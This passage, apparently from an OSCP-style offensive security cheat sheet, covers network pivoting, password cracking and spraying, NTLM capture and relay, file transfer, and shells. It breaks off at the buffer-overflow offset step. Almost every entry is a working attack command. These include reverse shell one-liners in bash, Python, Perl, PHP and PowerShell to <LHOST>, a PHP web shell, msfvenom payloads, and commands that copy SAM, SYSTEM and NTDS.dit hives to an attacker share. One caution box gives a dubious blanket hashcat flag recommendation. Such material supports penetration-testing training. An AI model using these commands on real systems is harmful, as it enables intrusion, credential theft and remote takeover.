> Key environment indicators confirming that network restrictions require the setup of pivot routes or tunnels.
> 
> Plaintext
> 
> ```
> - Local foothold host MS01 (192.168.x.101) holds an active path to an isolated host MS02 (10.10.10.50)
> - System socket lists (ss -tlnp) reveal active services bound strictly to the local loopback address (127.0.0.1)
> - Valid credentials harvested for an internal network entity that is not directly accessible from the internet
> - Active Directory domain controllers reside on a backend network segment that cannot be reached directly
> ```

## Ligolo-ng (Best for OSCP — Full Network Tunnel)

### ── SETUP ────────────────────────────────────────────────────

> [!abstract] 🐧 Linux Bash: Setting Up Local Core Tunnel Interfaces and Launching proxy Infrastructure
> 
> Configures a new virtual TUN interface on the attacker platform and starts the Ligolo-ng proxy listener to capture agent connections.
> 
> Bash
> 
> Bash
> 
> ```
> sudo ip tuntap add user $(whoami) mode tun ligolo
> sudo ip link set ligolo up
> ./proxy -selfcert -laddr 0.0.0.0:11601
> ```

> [!abstract] 🐧 Linux Bash: Running Attacker Web Backends to Host Agent Executables Binaries
> 
> Launches an HTTP server instance to deliver cross-platform Ligolo agent binaries to compromise hosts.
> 
> Bash
> 
> Bash
> 
> ```
> python3 -m http.server 80
> ```

> [!abstract] 💾 Windows CMD: Downloading and Running the Local Inbound Pivoting Agent (Windows Host Target)
> 
> Downloads and runs the Ligolo agent on a Windows target, connecting back to the attacker's proxy listener.
> 
> DOS
> 
> DOS
> 
> ```
> certutil -urlcache -split -f http://<LHOST>/agent.exe agent.exe
> .\agent.exe -connect <LHOST>:11601 -ignore-cert
> ```

> [!abstract] 🐧 Linux Bash: Running the Local Inbound Pivoting Agent (Linux Compromised Endpoint Target)
> 
> Connects a compromised Linux host back to the attacker platform as an active network pivot agent.
> 
> Bash
> 
> Bash
> 
> ```
> ./agent -connect <LHOST>:11601 -ignore-cert
> ```

> [!abstract] 💬 Ligolo C2: In-Console Interrogation of Active Connection Streams and Networks Layouts
> 
> Selects the active pivot agent session, maps its internal network interfaces, and starts the tunnel engine.
> 
> Plaintext
> 
> ```
> session                              # Selects the active target agent session string
> ifconfig                             # Maps the pivot host's internal subnets (e.g., 10.10.10.0/24)
> start                                # Restructures the TUN interface to receive network packets
> ```

> [!abstract] 🐧 Linux Bash: Registering Network Storage Boundaries Routes inside Attacker Host Kernels
> 
> Adds a new routing rule to the attacker platform kernel to direct all traffic for the internal subnet through the Ligolo interface.
> 
> Bash
> 
> Bash
> 
> ```
> sudo ip route add 10.10.10.0/24 dev ligolo
> ```

> [!check] 🐧 Linux Bash: Direct Multi-Protocol Reconnaissance Tracking Against Separated Internal Target Nodes
> 
> Runs security scanners and exploitation frameworks natively against internal targets through the established network route.
> 
> Bash
> 
> Bash
> 
> ```
> nmap -sV 10.10.10.50
> crackmapexec smb 10.10.10.50 -u user -p pass
> evil-winrm -i 10.10.10.50 -u user -p pass
> ```

> [!abstract] 💬 Ligolo C2: Exposing Isolated Internal Target Sub-Ports Back to Attacker Workspaces
> 
> Configures reverse listener proxies within the Ligolo session to expose internal target ports back to the attacker platform.
> 
> Plaintext
> 
> ```
> listener_add --addr 0.0.0.0:8080 --to 10.10.10.50:80 --tcp
> ```

> [!abstract] 💬 Ligolo C2: Establishing Nested Forwarding Vectors over Secondary Separated Network Subnets
> 
> Links multiple pivot agents together to establish a multi-hop tunnel into nested internal subnets.
> 
> Plaintext
> 
> ```
> # Deploys a loopback listener proxy rule on the primary pivot agent node:
> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
> # Runs the agent binary from the nested host, directing connections through the established link:
> .\agent.exe -connect <MS01_IP>:11601 -ignore-cert
> ```

> [!abstract] 🐧 Linux Bash: Allocating Kernel Routes Mapping for Double Pivot Segment Trees
> 
> Adds kernel routing parameters on the attacker platform to route traffic into the newly exposed inner network segment.
> 
> Bash
> 
> Bash
> 
> ```
> sudo ip route add 172.16.0.0/24 dev ligolo
> ```

## Chisel (Alternative)

> [!abstract] 🐧 Linux Bash: Launching Chisel Multi-Protocol Dynamic Reverse Proxy Listener Engine
> 
> Starts a Chisel server instance on the attacker platform to listen for incoming reverse SOCKS tunnel connections.
> 
> Bash
> 
> Bash
> 
> ```
> ./chisel server -p 8888 --reverse
> ```

> [!abstract] 💾 Windows CMD: Establishing Chisel Ingress Reverse SOCKS Interface Tunnel Back-Connections
> 
> Connects the compromised target back to the Chisel server to create an encrypted reverse SOCKS proxy tunnel.
> 
> DOS
> 
> DOS
> 
> ```
> .\chisel.exe client <LHOST>:8888 R:socks
> ```

> [!check] 🐧 Linux Bash: Processing Network Transactions over Dynamic Tunnel Paths via Proxychains Configs
> 
> Routes security tools through the Chisel proxy tunnel using Proxychains to scan internal network nodes.
> 
> Bash
> 
> Bash
> 
> ```
> proxychains nmap -sT -Pn 10.10.10.50
> proxychains crackmapexec smb 10.10.10.50 -u user -p pass
> proxychains evil-winrm -i 10.10.10.50 -u user -p pass
> ```

> [!abstract] 💾 Windows CMD: Forwarding Specific Isolated Internal Node Ports Back to Attacker Workspaces
> 
> Maps an internal service port (such as MySQL on 3306) to expose it directly on the local attacker loopback interface.
> 
> DOS
> 
> DOS
> 
> ```
> .\chisel.exe client <LHOST>:8888 R:3306:127.0.0.1:3306
> ```

## SSH Tunneling

> [!abstract] 🐧 Linux Bash: Allocating Local Sub-Ports Forwarding Mappings over Active OpenSSH Session Loops
> 
> Establishes a local port forwarding tunnel over an active SSH session to bridge access to a single internal service port.
> 
> Bash
> 
> Bash
> 
> ```
> ssh -L <LOCAL_PORT>:<INTERNAL_IP>:<INTERNAL_PORT> user@<MS01_IP>
> ssh -L 3389:10.10.10.50:3389 user@<MS01_IP>
> ```

> [!example] 🐧 Linux Bash: Interrogating Remote Desktop Frames over Locally Proxied Socket Interceptions
> 
> Launches an RDP client session directed at the local port forward to connect to the hidden internal system desktop.
> 
> Bash
> 
> Bash
> 
> ```
> xfreerdp /v:localhost:3389 /u:user /p:pass
> ```

> [!abstract] 🐧 Linux Bash: Spawning Full Ingress SOCKS Forwarding Infrastructure Arrays via OpenSSH Nodes
> 
> Creates a dynamic SOCKS proxy tunnel over SSH, routing local scanning traffic into the backend network segment.
> 
> Bash
> 
> Bash
> 
> ```
> ssh -D 1080 -N user@<MS01_IP>
> proxychains nmap -sT -Pn 10.10.10.0/24
> ```

> [!abstract] 💾 Windows CMD: Initializing Outbound Dynamic Reverse Network Channel Tunnels via Compromised Assets
> 
> Opens a reverse port forwarding tunnel from a compromised target back to the attacker platform over SSH.
> 
> DOS
> 
> DOS
> 
> ```
> ssh -R 4444:127.0.0.1:4444 attacker@<LHOST>
> ssh -R 445:127.0.0.1:445 attacker@<LHOST>
> ```

## Plink (Windows — When no native SSH client exists)

> [!abstract] 💾 Windows CMD: Requesting Diagnostic Binary Transfers for Standalone OpenSSH Forwarding Clients
> 
> Downloads Plink onto the target machine to provide a command-line automated SSH tunneling engine.
> 
> DOS
> 
> DOS
> 
> ```
> certutil -urlcache -split -f http://<LHOST>/plink.exe plink.exe
> ```

> [!abstract] 💾 Windows CMD: Launching Non-Interactive Automated Reverse SSH Port Forwarding Encapsulations
> 
> Runs Plink non-interactively to automatically tunnel a local target port (such as 445) back to the attacker's listener interface.
> 
> DOS
> 
> DOS
> 
> ```
> cmd /c echo y | .\plink.exe -ssh -l root -pw <SSH_PASS> -R 127.0.0.1:4455:127.0.0.1:445 <LHOST>
> ```

# PASSWORD ATTACKS

## Hash Identification

> [!check] 🐧 Linux Bash: Local Cryptographic Encryption Algorithm Identification Triage Scans
> 
> Analyzes signature values and character structures to determine the hash algorithm type and find its corresponding Hashcat mode.
> 
> Bash
> 
> Bash
> 
> ```
> hashid <HASH>
> hash-identifier   # Launches interactive pattern selection menu
> ```

> [!abstract] 🌳 Markdown List: Standard System Operating Cryptographic Mode Flags Index
> 
> Reference list mapping common hash formats to their internal Hashcat identifier codes.
> 
> Plaintext
> 
> ```
> # Key cryptographic hash formats:
> # $1$    → MD5crypt calculation string             (-m 500)
> # $2y$   → bcrypt encryption standard              (-m 3200)
> # $5$    → SHA256crypt system hash                 (-m 7400)
> # $6$    → SHA512crypt standard Linux value        (-m 1800)
> # 32 hex → Windows NTLM token format               (-m 1000) or standard MD5 (-m 0)
> # NTLM hashes always evaluate as 32 character hex strings without salt variables
> ```

## Hashcat Modes Reference

> [!caution] **Highly Optimized Hardware Kapacitor Override Performance Constraints** Always append `--force -O -w 4 --opencl-device-types 1,2` to your Hashcat processing chains to maximize hardware computing blocks and optimize cracking speeds.

```
# Basic attack format: hashcat -a <ATTACK_MODE> -m <HASH_TYPE> hashfile.txt wordlist.txt [rules]
# Core Hashcat Type Identifiers:
#   0    → MD5 Primitives
#   100  → SHA1 Strings
#   1000 → NTLM Hashes (Windows local account storage)
#   1400 → SHA256 Primitives
#   1800 → SHA512crypt (Linux shadow file format $6$)
#   500  → MD5crypt (Legacy Linux shadow files $1$)
#   3200 → bcrypt Algorithms ($2a$, $2b$, $2y$ containers)
#   5600 → NetNTLMv2 Exchange Formats (Responder captures)
#   5500 → NetNTLMv1 Legacy Exchanges
#   13100→ Kerberoasting Formats (TGS-REP tokens)
#   18200→ AS-REP Roasting Formats (Pre-auth disabled tokens)
#   22000→ WPA2-PBKDF2 Wireless Signatures
```

> [!check] 🐧 Linux Bash: High-Velocity Decryption Processing targeting Local or Intercepted Hashes
> 
> Launches optimized GPU-accelerated dictionary attacks against various types of harvested credential hashes.
> 
> Bash
> 
> Bash
> 
> ```
> hashcat -m 1000 ntlm.txt rockyou.txt --force -O -w 4 --opencl-device-types 1,2
> hashcat -m 5600 netntlm.txt rockyou.txt --force -O -w 4 --opencl-device-types 1,2
> hashcat -m 13100 tgs.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -O -w 4 --opencl-device-types 1,2
> hashcat -m 18200 asrep.txt rockyou.txt --force -O -w 4 --opencl-device-types 1,2
> hashcat -m 1800 shadow.txt rockyou.txt --force -O -w 4 --opencl-device-types 1,2
> ```

> [!abstract] 🌳 Markdown List: Core High-Performance Cryptographic Rules Files Reference Checklist
> 
> High-yield rule files used to mutate wordlists with character modifications, padding numbers, and special symbols.
> 
> Plaintext
> 
> ```
> /usr/share/hashcat/rules/best64.rule                 # Baseline character mutations
> /usr/share/hashcat/rules/d3ad0ne.rule                # Advanced structural mutations
> /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule   # Highly comprehensive mutations list
> ```

## Custom Wordlists

> [!check] 🐧 Linux Bash: Mining Cleartext Strings from Target Web Domains (Contextual Dictionary Generation)
> 
> Spiders a target website to extract page keywords and generate a custom, context-specific wordlist for password cracking.
> 
> Bash
> 
> Bash
> 
> ```
> cewl http://<TARGET_IP> -m 5 -d 3 -w cewl.txt
> cewl http://<TARGET_IP> -m 5 -d 3 --with-numbers -w cewl_nums.txt
> ```

> [!abstract] 🌳 Markdown List: Core Target Names In-Vault Manipulation Permutations Template Checklist
> 
> Standard credential mutations and naming patterns used to build custom user or password lists from discovered personnel names.
> 
> Plaintext
> 
> ```
> # Formatting variations based on target identity "John Smith":
> john          smith          jsmith
> j.smith       johnsmith      smithjohn
> john.smith    J.Smith        John.Smith
> ```

> [!check] 🐧 Linux Bash: Running Dictionary Generation Permutations over Standard Rules Repositories
> 
> Mutates a base wordlist by applying rule sets to output a newly generated file of password candidates.
> 
> Bash
> 
> Bash
> 
> ```
> hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
> ```

## Online Brute Force

> [!check] 🐧 Linux Bash: Launching Automated Network Protocol Ingress Brute-Force Attacks (Hydra Framework)
> 
> Performs targeted brute-force password testing against active management interfaces, authentication forms, or database systems.
> 
> Bash
> 
> Bash
> 
> ```
> hydra -l root -P rockyou.txt ssh://<TARGET_IP> -t 4 -V
> hydra -l admin -P rockyou.txt <TARGET_IP> http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
> hydra -l admin -P rockyou.txt http-get://<TARGET_IP>/admin/
> hydra -L users.txt -P rockyou.txt ftp://<TARGET_IP> -t 10
> hydra -l sa -P rockyou.txt mssql://<TARGET_IP>
> ```

> [!check] 🐧 Linux Bash: Launching Automated Multi-Threaded Remote Desktop Authentication Sprays
> 
> Tests a password list against target servers over RDP to find accounts with weak credentials.
> 
> Bash
> 
> Bash
> 
> ```
> crowbar -b rdp -s <TARGET_IP>/32 -u administrator -C rockyou.txt
> ```

> [!check] 🐧 Linux Bash: Processing Wide Subnet Credential Sprays targeting SMB and WinRM Entry Infrastructure
> 
> Sprays lists of users and passwords across a subnet to quickly identify valid credentials and accessible hosts over SMB or WinRM.
> 
> Bash
> 
> Bash
> 
> ```
> netexec smb <TARGET_IP> -u users.txt -p passwords.txt --no-bruteforce
> netexec winrm <TARGET_IP> -u users.txt -p passwords.txt
> ```

## NTLM Capture & Relay

> [!abstract] 🐧 Linux Bash: Initializing Outbound Traffic Interception Engines capturing Network Hashing Protocols
> 
> Listens on the network interface to intercept NetBIOS, LLMNR, and MDNS broadcast traffic, capturing authentication hashes from connecting systems.
> 
> Bash
> 
> Bash
> 
> ```
> sudo responder -I tun0 -dwv
> ```

> [!check] 🐧 Linux Bash: Processing Offline Decryption Modules targeting Captured Intercepted NetNTLMv2 Exchange Logs
> 
> Runs dictionary cracking attacks against authentication logs captured by Responder.
> 
> Bash
> 
> Bash
> 
> ```
> hashcat -m 5600 Responder/logs/HTTP-NTLMv2-*.txt rockyou.txt
> ```

> [!check] 🐧 Linux Bash: Identifying Domain Asset Compute Targets with SMB Data Signing Protections Disabled
> 
> Scans a subnet to locate hosts that have SMB signing disabled, mapping them out as candidates for NTLM relay attacks.
> 
> Bash
> 
> Bash
> 
> ```
> netexec smb <SUBNET>/24 --gen-relay-list unsigned.txt
> ```

> [!example] 🐧 Linux Bash: Launching Authentication Traffic Relaying Ingress Infrastructure Servers Loops
> 
> Relays intercepted authentication traffic to a list of vulnerable target hosts to automatically execute code or extract local databases.
> 
> Bash
> 
> Bash
> 
> ```
> sudo python3 ntlmrelayx.py -tf unsigned.txt -smb2support
> ```

> [!example] 🐧 Linux Bash: Instantiating Interactive Process Port Relays within NTLM Relaying Modules
> 
> Starts the relay engine with interactive mode enabled, binding connections to local loopback ports for manual shell interception.
> 
> Bash
> 
> Bash
> 
> ```
> sudo python3 ntlmrelayx.py -tf unsigned.txt -smb2support -i
> # Interactive connection listener execution point:
> nc 127.0.0.1 <RELAY_PORT>
> ```

# FILE TRANSFER CHEATSHEET

## Linux ➔ Windows (Download on victim)

> [!note] 🪟 PowerShell: In-Memory Script Payload Streaming and Execute-Only Process Allocations
> 
> Downloads a remote PowerShell script string and executes it straight inside memory to avoid writing files to disk.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')  # Executes fileless in memory
> ```

> [!note] 🪟 PowerShell: Hard-Disk Storage Target Downloader Transfers Assemblies Execution
> 
> Uses different PowerShell methods to download files from an attacker host and save them onto the target disk.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> (New-Object Net.WebClient).DownloadFile('http://<LHOST>/file.exe','C:\Temp\file.exe')
> Invoke-WebRequest -Uri http://<LHOST>/file.exe -OutFile C:\Temp\file.exe
> wget http://<LHOST>/file.exe -OutFile C:\Temp\file.exe  # Uses PowerShell alias handling
> ```

> [!note] 💾 Windows CMD: Downloading Inbound Payload Files via Built-In Cryptographic Cache Managers
> 
> Uses certutil to download binaries directly from an attacker-controlled web server to a target directory.
> 
> DOS
> 
> DOS
> 
> ```
> certutil -urlcache -split -f http://<LHOST>/file.exe C:\Temp\file.exe
> ```

> [!note] 💾 Windows CMD: Registering Background Asynchronous Download Queue Tasks (BITS Engine)
> 
> Creates an asynchronous download job via bitsadmin to fetch files stealthily in the background.
> 
> DOS
> 
> DOS
> 
> ```
> bitsadmin /transfer job /download /priority normal http://<LHOST>/file.exe C:\Temp\file.exe
> ```

> [!abstract] 🐧 Linux Bash: Launching Loopback Shared Drives Directories Hosting Modules
> 
> Starts an SMB share server on the attacker platform to expose files directly over port 445 with SMBv2 support enabled.
> 
> Bash
> 
> Bash
> 
> ```
> python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support
> ```

> [!note] 💾 Windows CMD: Copying Payload Binaries Directly across Active Shared Network Mount Drives
> 
> Copies files straight from the attacker's exposed network share into a local target directory.
> 
> DOS
> 
> DOS
> 
> ```
> copy \\<LHOST>\share\file.exe C:\Temp\
> # Alternative explicit mounting logic syntax:
> net use Z: \\<LHOST>\share
> copy Z:\file.exe C:\Temp\
> ```

## Windows ➔ Linux (Exfil from victim)

> [!abstract] 🐧 Linux Bash: Initializing Secure Shared Drive Ingress Platforms for Target Files Ingestion
> 
> Prepares a password-protected SMB share on the attacker platform to securely receive exfiltrated target files.
> 
> Bash
> 
> Bash
> 
> ```
> impacket-smbserver share . -smb2support -username user -password pass
> ```

> [!note] 💾 Windows CMD: Exfiltrating Active Configuration Hashes Databases across Attacker Mounted Volumes
> 
> Copies protected local hash hives straight onto the attacker's exposed network share.
> 
> DOS
> 
> DOS
> 
> ```
> copy C:\Windows\System32\config\SAM \\<LHOST>\share\SAM
> ```

> [!note] 💾 Windows CMD: Authenticating and Transferring Core Security Hives in Compromised Remote Shell environments
> 
> Mounts the attacker's exfiltration share inline within a remote shell to transfer core system hives and database files.
> 
> DOS
> 
> DOS
> 
> ```
> net use \\10.10.15.201\share /user:user pass
> cmd.exe /c move SAM \\10.10.15.201\share\
> cmd.exe /c move SECURITY \\10.10.15.201\share\
> cmd.exe /c move SYSTEM \\10.10.15.201\share\
> cmd.exe /c move NTDS.dit \\10.10.15.201\share\
> ```

> [!check] 🐧 Linux Bash: Remote Extraction of Corporate Domain Accounts Hashes
> 
> Uses NetExec to trigger a remote ntdsutil execution, dumping the Active Directory database securely over network channels.
> 
> Bash
> 
> Bash
> 
> ```
> netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
> ```

> [!note] 💾 Windows CMD: Consolidated Mass Copying of Sensitive Target Security Configuration Hives
> 
> Copies all primary local registry hives to the attacker's network share in a single command block.
> 
> DOS
> 
> DOS
> 
> ```
> copy C:\Windows\System32\config\SAM C:\Windows\System32\config\SYSTEM C:\Windows\System32\config\SECURITY \\<LHOST>\share\
> ```

> [!abstract] 🐧 Linux Bash: Launching Local File Delivery Web Receivers
> 
> Starts a specialized Python upload server on the attacker platform to accept files transmitted via HTTP POST requests.
> 
> Bash
> 
> Bash
> 
> ```
> python3 uploadserver.py
> ```

> [!note] 🪟 PowerShell: Exfiltrating Consolidated System Files Archive Streams via Outbound HTTP POST Form Vectors
> 
> Transmits a packaged zip archive from the target machine directly to the attacker's web receiver using an HTTP POST request.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> Invoke-WebRequest -Uri http://<LHOST>/upload -Method POST -InFile C:\loot\dump.zip -ContentType "application/octet-stream"
> ```

> [!note] 🪟 PowerShell: Encoding Raw Binary System Components into Cleartext Base64 Paste Arrays
> 
> Converts a binary file on the target into a plain text base64 string to allow text-based copy-paste exfiltration over restricted shells.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\file.txt"))
> ```

> [!note] 🐧 Linux Bash: Base64 Decryption Processing to Restore Transported System Components
> 
> Decodes a copied base64 text string on the attacker platform to restore the original binary file format.
> 
> Bash
> 
> Bash
> 
> ```
> echo '<BASE64_STRING>' | base64 -d > file.txt
> ```

> [!abstract] 🐧 Linux Bash: Initializing Target-Facing File Capture Receivers via Raw Socket Listeners
> 
> Sets up a raw Netcat listener on the attacker platform to capture an incoming file stream over a specific port.
> 
> Bash
> 
> Bash
> 
> ```
> nc -lvnp 9001 > file.exe
> ```

> [!note] 💾 Windows CMD: Exfiltrating Target Files via Redirection Operators over Outbound Raw Streams Connection
> 
> Pipes a local file binary directly into an outbound Netcat stream to send it to the attacker's listener port.
> 
> DOS
> 
> DOS
> 
> ```
> nc.exe <LHOST> 9001 < C:\file.exe
> ```

## Linux ➔ Linux

> [!abstract] 🐧 Linux Bash: Attacker Web Application Hosting Server Initialization Layout
> 
> Starts a standard Python HTTP server instance to serve utility scripts and exploits to compromised Linux targets.
> 
> Bash
> 
> Bash
> 
> ```
> python3 -m http.server 80
> ```

> [!note] 🐧 Linux Bash: Ingress Ingestion of Malicious Script Components over Target Terminal Partitions
> 
> Uses wget or curl on a compromised Linux host to download files hosted on the attacker platform.
> 
> Bash
> 
> Bash
> 
> ```
> wget http://<LHOST>/file
> curl http://<LHOST>/file -o file
> ```

> [!note] 🐧 Linux Bash: Automated Secured Symmetric File Synchronization Exchanges between Linux Targets
> 
> Uses SCP to securely copy files over an active SSH connection to a specific remote folder path.
> 
> Bash
> 
> Bash
> 
> ```
> scp file.txt user@<TARGET_IP>:/tmp/
> ```

> [!abstract] 🐧 Linux Bash: Local Receiver Interception Configuration mapping for Raw Linux Data Partitions Transfer
> 
> Opens a raw socket listener on the attacker platform to catch an incoming file sync stream from a target Linux host.
> 
> Bash
> 
> Bash
> 
> ```
> nc -lvnp 4444 > file
> ```

> [!note] 🐧 Linux Bash: Transmitting Target Assets via Pipeline Redirections over Established Socket Paths
> 
> Redirects file data into a raw outbound network socket connection to transfer it to the receiver.
> 
> Bash
> 
> Bash
> 
> ```
> nc <RECEIVER_IP> 4444 < file
> ```

> [!note] 🐧 Linux Bash: Base64 Conversion Operations tracking System Application Executables
> 
> Encodes binary files into plain text formats for easy copy-paste transfer across shell contexts.
> 
> Bash
> 
> Bash
> 
> ```
> base64 -w0 file.exe   # Encodes binary to a single text line string
> echo '<BASE64_STRING>' | base64 -d > file.exe  # Decodes string back to binary format
> ```

# SHELLS & UPGRADES

## Reverse Shell One-Liners

### ── Linux ─────────────────────────────────────────────────────

> [!example] 🐧 Linux Bash: Standard POSIX File Descriptor Loop Interception Reverse Shell Ingress
> 
> Invokes an outbound interactive bash process redirecting standard streams straight into an established network socket.
> 
> Bash
> 
> Bash
> 
> ```
> bash -i >& /dev/tcp/<LHOST>/4444 0>&1
> /bin/bash -i >& /dev/tcp/<LHOST>/4444 0>&1
> ```

> [!example] 🌐 URL Ingress: URL Encoded Variant of the Standard POSIX Bash Pipeline
> 
> URL-encoded format of the bash one-liner, ready to be passed directly into web application parameters or web fuzzer fields.
> 
> Plaintext
> 
> ```
> bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<LHOST>%2F4444%200%3E%261%22
> ```

> [!example] 🐧 Linux Bash: Spawning Inbound Network Connections Interceptions via Python Socket Sub-Processes
> 
> Uses Python scripts to spawn a pseudo-terminal session and connect it back to the attacker's socket handler.
> 
> Bash
> 
> Bash
> 
> ```
> python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
> ```

> [!example] 🌐 URL Ingress: Hardcoded Arbitrary Command Injection System Backdoor Hook Wrapper
> 
> A minimal PHP code snippet uploaded to create an immediate web-shell execution gateway via GET parameters.
> 
> Plaintext
> 
> ```
> <?php system($_GET["cmd"]); ?>
> ```

> [!example] 🐧 Linux Bash: Instantiating PHP Back-Network Terminal Streams Connection
> 
> Opens an outbound network connection from a PHP interpreter environment to route shell streams back to the listener.
> 
> Bash
> 
> Bash
> 
> ```
> php -r '$sock=fsockopen("<LHOST>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
> ```

> [!example] 🐧 Linux Bash: Spawning Perl Environmental Core Process Strings for Outbound Shell Handling
> 
> Uses Perl's low-level socket functions to connect the host's standard input and output streams back to the attacker's port.
> 
> Bash
> 
> Bash
> 
> ```
> perl -e 'use Socket;$i="<LHOST>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
> ```

> [!example] 🐧 Linux Bash: Traditional Inbound Shell Processing via Executable Redirection Handlers (Netcat Integration)
> 
> Uses Netcat's native execution flag (`-e`) to redirect a functional system shell back to a remote host listener.
> 
> Bash
> 
> Bash
> 
> ```
> nc -e /bin/sh <LHOST> 4444
> ```

> [!example] 🐧 Linux Bash: Evasive Named Pipe Non-Interactive Terminal Loop Interception Spawning (FIFO Backdoors)
> 
> Creates a back-and-forth communication channel using a named pipe FIFO object when Netcat execution flags are blocked on the target.
> 
> Bash
> 
> Bash
> 
> ```
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f
> ```

### ── Windows ───────────────────────────────────────────────────

> [!example] 🐧 Linux Bash: Attacker Automated Compilation of Base64 In-Memory Script Loading Strings
> 
> Encodes a PowerShell download-and-execute payload string into base64 format to bypass basic script filters and prevent parameter parsing syntax breaks.
> 
> Bash
> 
> Bash
> 
> ```
> python3 -c "
> import base64
> cmd = 'IEX(New-Object Net.WebClient).DownloadString(\"http://<LHOST>/shell.ps1\")'
> b64 = base64.b64encode(cmd.encode('utf-16-le')).decode()
> print('powershell -nop -w hidden -enc ' + b64)
> "
> ```

> [!example] 🪟 PowerShell: Native Assembly Non-Interactive Socket Client Thread Connection Loops
> 
> A pure PowerShell script string that creates a custom TCP client object to connect back and execute incoming commands locally.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> powershell -nop -w hidden -c "\$c=New-Object Net.Sockets.TCPClient('<LHOST>',4444);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$rb=[text.encoding]::ASCII.GetBytes(\$sb2);\$s.Write(\$rb,0,\$rb.Length)}"
> ```

> [!example] 🐧 Linux Bash: Generating Cross-Platform Windows Execution Payloads via Automated Assembly Factories
> 
> Uses msfvenom to compile standard executable payloads or script components targeting different Windows execution frameworks.
> 
> Bash
> 
> Bash
> 
> ```
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o shell.exe
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f aspx -o shell.aspx
> msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f raw -o shell.jsp
> msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war
> ```

## Shell Upgrade (Linux — TTY)

### Method 1: Python PTY (Most reliable)

> [!example] 🐧 Linux Bash: Python Pseudo-Terminal Spawning to Break Out of Blind Shell Threads
> 
> Uses Python's pty module to escape restricted shell threads and spawn a functional pseudo-terminal environment.
> 
> Bash
> 
> Bash
> 
> ```
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> # Alternative variation used on older host platforms:
> python -c 'import pty; pty.spawn("/bin/bash")'
> ```

> [!example] 🐧 Linux Bash: Relocating Shell Context Handlers out of Active Volatile Space via Foreground Controls
> 
> Suspends the current terminal session, modifies local terminal control flags to raw mode, and resumes the session in the foreground to enable tab completion and arrow keys.
> 
> Bash
> 
> Bash
> 
> ```
> # Background the active remote session using keyboard shortcuts: Ctrl + Z
> # Configure local terminal overrides and restore the session to the foreground:
> stty raw -echo; fg
> ```

> [!example] 🐧 Linux Bash: Stabilizing Interactive Terminal Global System Environmental Variables
> 
> Sets proper environment variables and matches terminal grid geometry dimensions to align output and prevent display issues inside text editors.
> 
> Bash
> 
> Bash
> 
> ```
> export TERM=xterm
> export SHELL=/bin/bash
> stty rows 48 columns 190            # Adjust these numbers to match your local terminal layout
> stty size
> ```

### Method 2: Script

> [!example] 🐧 Linux Bash: Stabilizing Terminal Contexts via POSIX Script Generation Records
> 
> Uses the built-in `script` utility to spawn an interactive shell process when Python runtimes are missing on the target.
> 
> Bash
> 
> Bash
> 
> ```
> script /dev/null -c bash
> # Followed by standard background sequence: Ctrl + Z -> stty raw -echo; fg -> export TERM=xterm
> ```

### Method 3: Socat (Best quality, needs socat on victim)

> [!abstract] 🐧 Linux Bash: Initializing Advanced Fully Stable Hardware Listeners
> 
> Opens an advanced Socat listener on the attacker platform to catch fully interactive terminal streams natively.
> 
> Bash
> 
> Bash
> 
> ```
> socat file:`tty`,raw,echo=0 tcp-listen:4444
> ```

> [!example] 🐧 Linux Bash: Compromised Endpoint Back-Connection to Attacker Advanced Socat Receivers
> 
> Executes an outbound Socat client on the compromised host, linking system terminal descriptors to the attacker's advanced listener.
> 
> Bash
> 
> Bash
> 
> ```
> socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:4444
> ```

# EXPLOIT DEVELOPMENT (BOF REFERENCE)

## Windows x86 Stack Buffer Overflow

### ── Step 1: Fuzzing ──────────────────────────────────────────

> [!example] 🐍 Python Script: Automated Network Fuzzing Matrix to Determine Memory Crash Thresholds
> 
> Sends increasingly large buffer payloads to a target network service port to monitor for process crashes and isolate memory threshold limits.
> 
> Python
> 
> Python
> 
> ```
> import socket, time
>  
> payload = b"A" * 100
> while True:
>      try:
>          s = socket.socket()
>          s.connect(('TARGET_IP', PORT))
>          banner = s.recv(1024)
>          s.send(b"COMMAND " + payload + b"\r\n")
>          s.close()
>          print(f"[*] Sent {len(payload)} bytes")
>          payload += b"A" * 100
>          time.sleep(1)
>      except Exception as e:
>          print(f"[!] Crashed at ~{len(payload)} bytes")
>          break
> ```

### ── Step 2: EIP Offset ───────────────────────────────────────

> [!example] 🐧 Linux Bash: Creating Non-Repeating Cyclical Pattern Strings to Isolate Offset Ranges
> 
